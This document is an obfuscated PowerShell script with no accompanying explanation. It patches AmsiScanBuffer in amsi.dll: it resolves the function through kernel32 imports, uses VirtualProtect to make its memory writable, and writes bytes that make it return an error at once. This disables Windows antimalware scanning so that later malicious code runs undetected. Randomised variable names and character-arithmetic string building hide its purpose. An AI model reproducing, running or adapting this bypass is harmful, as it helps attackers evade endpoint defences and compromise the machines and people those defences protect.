$mown8Zultd6S2lGyE = @"
using System;
using System.Runtime.InteropServices;
public class mown8Zultd6S2lGyE {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr kowN, string U1SGiNTG5MyabDaW);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr qOP5L2Tb90s9wQ6V, UIntPtr ICjAY88qV6lAw3Vx3i, uint I_aQ5x_Ox4CWX, out uint uYcdHVyTNYmFj);
}
"@

Add-Type $mown8Zultd6S2lGyE

$ZxZ028npS = [mown8Zultd6S2lGyE]::LoadLibrary("$(('àm'+'sì'+'.d'+'ll').nORmalIze([CHaR]([Byte]0x46)+[cHAr](111*29/29)+[CHaR](114*35/35)+[chAR]([byTe]0x6d)+[chaR]([BYtE]0x44)) -replace [chAR]([bYtE]0x5c)+[CHAr]([BYTe]0x70)+[chAr](123+51-51)+[CHar](77)+[ChAR]([byTe]0x6e)+[cHaR](125+66-66))")
$UUmZqW1eRP = [mown8Zultd6S2lGyE]::GetProcAddress($ZxZ028npS, "$([cHar]([bYTE]0x41)+[Char](109)+[ChAr](115+65-65)+[chAr](105+41-41)+[ChAR]([BytE]0x53)+[ChAR](99*42/42)+[ChAr]([bYte]0x61)+[ChAR](110+102-102)+[CHar](66*40/40)+[ChAr]([bYTe]0x75)+[cHaR](24+78)+[CHAR](102*22/22)+[cHar](15+86)+[Char]([BYTE]0x72))")
$p = 0
[mown8Zultd6S2lGyE]::VirtualProtect($UUmZqW1eRP, [uint32]5, 0x40, [ref]$p)
$_tZqn0Rg3_G_FjaCY = "0xB8"
$L_uyWb1qy = "0x57"
$apCy = "0x00"
$rMVa0u8z3YzG6 = "0x07"
$NjG4dCP = "0x80"
$ZmYW = "0xC3"
$BoO = [Byte[]] ($_tZqn0Rg3_G_FjaCY,$L_uyWb1qy,$apCy,$rMVa0u8z3YzG6,+$NjG4dCP,+$ZmYW)
[System.Runtime.InteropServices.Marshal]::Copy($BoO, 0, $UUmZqW1eRP, 6)